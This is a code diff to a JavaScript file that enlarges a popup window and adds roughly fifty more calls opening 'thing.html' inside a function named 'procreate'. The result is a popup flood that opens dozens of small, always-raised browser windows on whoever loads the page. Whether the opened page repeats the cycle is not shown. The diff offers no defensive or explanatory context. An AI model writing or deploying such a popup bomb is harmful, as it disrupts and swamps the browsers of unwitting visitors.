@@ -7,7 +7,7 @@
 		var flagRun = 1;
 
 function openWindow(url){
-        aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=180,height=175,titlebar=no,alwaysRaised=yes');
+        aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=264,height=175,titlebar=no,alwaysRaised=yes');
 }
 
 function procreate(){
@@ -16,7 +16,62 @@ function procreate(){
 		openWindow('thing.html');
 		openWindow('thing.html');
 		openWindow('thing.html');
+                openWindow('thing.html');
+                openWindow('thing.html');
 		openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+                openWindow('thing.html');
+                openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+                openWindow('thing.html');
+                openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+                openWindow('thing.html');
+                openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+                openWindow('thing.html');
+                openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+                openWindow('thing.html');
+                openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+                openWindow('thing.html');
+                openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+                openWindow('thing.html');
+                openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+                openWindow('thing.html');
+                openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+		openWindow('thing.html');
+                openWindow('thing.html');
+                
 		}
 
 function newXlt(){
